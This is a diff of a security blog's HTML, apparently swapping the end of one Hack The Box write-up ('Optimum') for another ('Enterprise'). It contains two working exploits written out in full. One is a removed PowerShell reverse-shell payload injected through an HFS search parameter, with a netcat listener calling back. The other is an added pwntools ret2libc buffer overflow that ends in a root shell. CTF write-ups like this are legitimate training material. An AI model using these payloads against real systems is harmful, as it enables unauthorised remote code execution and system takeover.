+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">import</span> <span class="nn">struct</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">subprocess</span> <span class="kn">import</span> <span class="n">call</span>
 
-<span class="k">if</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">):</span>
-    <span class="k">print</span><span class="p">(</span><span class="s2">&#34;usage: &lt;RHOST&gt; &lt;RPORT&gt; &lt;LHOST&gt; &lt;LPORT&gt;&#34;</span><span class="p">)</span>
-    <span class="nb">exit</span><span class="p">()</span>
+<span class="n">DEBUG</span> <span class="o">=</span> <span class="bp">False</span>
+<span class="n">RHOST</span> <span class="o">=</span> <span class="s2">&#34;10.10.10.61&#34;</span>
+<span class="n">RPORT</span> <span class="o">=</span> <span class="mi">32812</span>
 
-<span class="n">RHOST</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
-<span class="n">RPORT</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
-<span class="n">LHOST</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
-<span class="n">LPORT</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span>
+<span class="k">if</span> <span class="n">DEBUG</span><span class="p">:</span>
+    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;info&#39;</span>
 
-<span class="k">print</span><span class="p">(</span><span class="s2">&#34;RHOST=&#34;</span><span class="o">+</span><span class="n">RHOST</span><span class="o">+</span><span class="s2">&#34; RPORT=&#34;</span><span class="o">+</span><span class="n">RPORT</span><span class="o">+</span><span class="s2">&#34; LHOST=&#34;</span><span class="o">+</span><span class="n">LHOST</span><span class="o">+</span><span class="s2">&#34; LPORT=&#34;</span><span class="o">+</span><span class="n">LPORT</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">conv</span><span class="p">(</span><span class="n">num</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;&lt;I&#34;</span><span class="p">,</span><span class="n">num</span><span class="p">)</span>
 
-<span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;$client = New-Object System.Net.Sockets.TCPClient(&#39;&#34;</span><span class="o">+</span><span class="n">LHOST</span><span class="o">+</span><span class="s2">&#34;&#39;,&#34;</span><span class="o">+</span><span class="n">LPORT</span><span class="o">+</span><span class="s2">&#34;); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2&gt;&amp;1 | Out-String ); $sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close();&#34;</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">212</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">conv</span><span class="p">(</span><span class="mh">0xf7e4c060</span><span class="p">)</span> <span class="c1"># system()</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">conv</span><span class="p">(</span><span class="mh">0xf7e3faf0</span><span class="p">)</span> <span class="c1"># exit()</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">conv</span><span class="p">(</span><span class="mh">0xf7f6ddd5</span><span class="p">)</span> <span class="c1"># &#39;sh&#39;</span>
 
-<span class="k">print</span><span class="p">(</span><span class="n">payload</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">RHOST</span><span class="p">,</span> <span class="n">RPORT</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Enter Bridge Access Code: &#34;</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;picarda1&#34;</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Waiting for input: &#34;</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;4&#34;</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Enter Security Override:&#34;</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></div></p>
 
-<span class="n">b64enc_command</span> <span class="o">=</span> <span class="n">b64encode</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;UTF-16LE&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;+&#39;</span><span class="p">,</span><span class="s1">&#39;%2b&#39;</span><span class="p">)</span>
+<p>That&rsquo;s all folks! :)</p>
 
-<span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://&#34;</span><span class="o">+</span><span class="n">RHOST</span><span class="o">+</span><span class="s2">&#34;:&#34;</span><span class="o">+</span><span class="n">RPORT</span><span class="o">+</span><span class="s2">&#34;/?search=%00{.exec%7CC:</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">System32</span><span class="se">\\</span><span class="s2">WindowsPowerShell</span><span class="se">\\</span><span class="s2">v1.0</span><span class="se">\\</span><span class="s2">powershell.exe%20-EncodedCommand%20&#34;</span><span class="o">+</span><span class="n">b64enc_command</span><span class="o">+</span><span class="s2">&#34;.}&#34;</span>
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ ./pwn_lcars.py 
+[+] Opening connection to 10.10.10.61 on port 32812: Done
+[*] Switching to interactive mode
 
-<span class="k">print</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
-<span class="n">response</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">STATUS: &#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">getcode</span><span class="p">()))</span></code></pre></div></p>
-
-<p>Let&rsquo;s run the above python script.
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ nc -lvp 60002
-listening on [any] 60002 ...
-
-$ python send_powershell_payload.py 10.10.10.8 80 LHOST 60002
-
-connect to [10.10.15.150] from (UNKNOWN) [10.10.10.8] 49258
-PS C:\Users\kostas\Desktop&gt; </code></pre></div></div></p>
+$ whoami
+root</code></pre></div></div>
 
         </div>
 
         <aside>
           <div class="p-share centered">
-            <a href="http://www.facebook.com/sharer.php?src=bm&u=https%3a%2f%2falamot.github.io%2foptimum_writeup%2f&t=Optimum%20write-up" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-facebook"></i></a>
-            <a href="https://plus.google.com/share?url=https%3a%2f%2falamot.github.io%2foptimum_writeup%2f" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-google-plus"></i></a>
-            <a lang="en" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2foptimum_writeup%2f&text=Optimum%20write-up&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
-            <a lang="el" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2foptimum_writeup%2f&text=%ce%91%ce%bd%ce%ac%ce%bb%cf%85%cf%83%ce%b7%20%cf%84%ce%bf%cf%85%20Optimum&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
-            <a lang="en" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2foptimum_writeup%2f&description=Optimum%20write-up&media=https://alamot.github.io/images/optimum.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
-            <a lang="el" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2foptimum_writeup%2f&description=%ce%91%ce%bd%ce%ac%ce%bb%cf%85%cf%83%ce%b7%20%cf%84%ce%bf%cf%85%20Optimum&media=https://alamot.github.io/images/optimum.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
+            <a href="http://www.facebook.com/sharer.php?src=bm&u=https%3a%2f%2falamot.github.io%2fenterprise_writeup%2f&t=Enterprise%20write-up" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-facebook"></i></a>
+            <a href="https://plus.google.com/share?url=https%3a%2f%2falamot.github.io%2fenterprise_writeup%2f" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-google-plus"></i></a>
+            <a lang="en" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2fenterprise_writeup%2f&text=Enterprise%20write-up&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
+            <a lang="el" href="http://twitter.com/intent/tweet?url=https%3a%2f%2falamot.github.io%2fenterprise_writeup%2f&text=%ce%91%ce%bd%ce%ac%ce%bb%cf%85%cf%83%ce%b7%20%cf%84%ce%bf%cf%85%20Enterprise&tw_p=tweetbutton" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-twitter"></i></a>
+            <a lang="en" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2fenterprise_writeup%2f&description=Enterprise%20write-up&media=https://alamot.github.io/images/space.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
+            <a lang="el" href="http://pinterest.com/pin/create/link/?url==https%3a%2f%2falamot.github.io%2fenterprise_writeup%2f&description=%ce%91%ce%bd%ce%ac%ce%bb%cf%85%cf%83%ce%b7%20%cf%84%ce%bf%cf%85%20Enterprise&media=https://alamot.github.io/images/space.jpg" onclick="window.open(this.href, 'PCwindow', 'width=550, height=350, menubar=no, toolbar=no, scrollbars=yes'); return false;"><i class="fa fa-pinterest-p"></i></a>
           </div>
         </aside>
       </article>
@@ -720,22 +993,6 @@ PS C:\Users\kostas\Desktop&gt; </code></pre></div></div></p>
           
            
            
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/enterprise_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/space.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Enterprise write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Enterprise</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">19 Mar 2018</time>
-      <time lang="el">19 Μαρ 2018</time>
-    </footer>
-  </a>
-</article>
-
            
           
            
@@ -800,6 +1057,22 @@ PS C:\Users\kostas\Desktop&gt; </code></pre></div></div></p>
           
            
            
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Optimum write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">28 Oct 2017</time>
+      <time lang="el">28 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
